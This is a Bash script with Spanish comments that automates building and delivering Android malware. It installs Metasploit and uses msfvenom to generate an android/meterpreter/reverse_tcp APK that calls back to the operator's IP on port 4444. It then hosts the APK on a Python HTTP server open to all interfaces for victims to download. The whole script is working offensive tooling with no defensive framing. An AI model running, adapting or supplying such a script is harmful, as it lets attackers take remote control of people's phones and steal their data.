#!/bin/bash

source ./utilities/utils.sh

# Función para mostrar el uso del script
usage() {
    echo "Uso: $0 [-ip <IP_ADDRESS>] [-port <PORT>]"
    exit 1
}

# Inicializar las variables
LOCAL_IP=""
PORT=""

# Procesar las opciones de línea de comandos
while [[ $# -gt 0 ]]; do
    case "$1" in
        -i|--ip)
            LOCAL_IP="$2"
            shift 2
            ;;
        --p|--port)
            PORT="$2"
            shift 2
            ;;
        -h|--help)
            usage
            exit 0
            ;;
        *)
            usage
            exit 1
            ;;
    esac
done

# Si no se proporcionó una IP, intentar obtener la IP local
if [[ -z "$LOCAL_IP" ]]; then
    LOCAL_IP=$(hostname -I | awk '{print $1}')
fi

if [[ -z "$LOCAL_IP" ]]; then
    print_red "No se pudo obtener la dirección IP local, prueba -h para obtener ayuda."
    exit 1
fi

# Si no se proporcionó un puerto, usar un valor predeterminado
if [[ -z "$PORT" ]]; then
    # Eliminamos los procesos que estén utilizando el puerto 8080
    sudo fuser -k 4444/tcp &>/dev/null
    PORT=4444
fi

# Si no tenemos instalado msfvenom lo instalamos
if ! command -v msfvenom &> /dev/null; then
    print_red "msfvenom no está instalado. Instalándolo..."
    sudo apt-get install -y metasploit-framework
    if [ $? -ne 0 ]; then
        print_red "Error al instalar msfvenom."
        exit 1
    fi
fi

# Eliminar si ya dispongo de un archivo main.apk
if [ -f main.apk ]; then
    print_red "El archivo main.apk ya está creado, eliminando..."
    # Eliminar el archivo main.apk
    rm main.apk
fi

echo "Generando payload..."
# Generar el payload de Android con msfvenom, en ../main.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$PORT -o main.apk
if [ $? -eq 0 ]; then
    print_green "Payload generado exitosamente: main.apk, LHOST=$LOCAL_IP, LPORT=$PORT"
else
    print_red "Error al generar el payload."
    exit 1
fi

# Verificar si tenemos instalado Python 3
if ! command -v python3 &> /dev/null; then
    print_red "Python 3 no está instalado. Instalándolo..."
    sudo apt-get install -y python3
    if [ $? -ne 0 ]; then
        print_red "Error al instalar Python 3."
        exit 1
    fi
fi


PORT_PYTHON=8000
# Nos aseguramos que el puerto 8000 no esté en uso, si lo esta utilizamos otro
if nc -z 127.0.0.1 $PORT_PYTHON &> /dev/null; then
    # Nos aseguramos que el puerto 8000 no esté en uso, si lo esta utilizamos otro
    print_red "El puerto $PORT_PYTHON está en uso. Cerrándolo..."
    sudo fuser -k $PORT_PYTHON/tcp &>/dev/null
elif ss -tuln | grep -q ":$PORT_PYTHON "; then
    print_red "El puerto $PORT_PYTHON está en uso. Cerrándolo..."
    sudo fuser -k $PORT_PYTHON/tcp &>/dev/null
fi

# Creamos un servidor HTTP para descargar el APK con Python 3
python3 -m http.server $PORT_PYTHON --bind 0.0.0.0 &>/dev/null &

# Verificar si se inició el servidor HTTP
if [ $? -eq 0 ]; then
    print_green "Servidor HTTP iniciado en el puerto $PORT_PYTHON."
else
    print_red "Error al iniciar el servidor HTTP."
    exit 1
fi

# Verificar si el archivo main.apk se generó correctamente
if [ -f main.apk ]; then
    print_green "Archivo main.apk disponible en http://$LOCAL_IP:$PORT_PYTHON/main.apk"
else
    print_red "Error: main.apk no se generó correctamente."
    exit 1
fi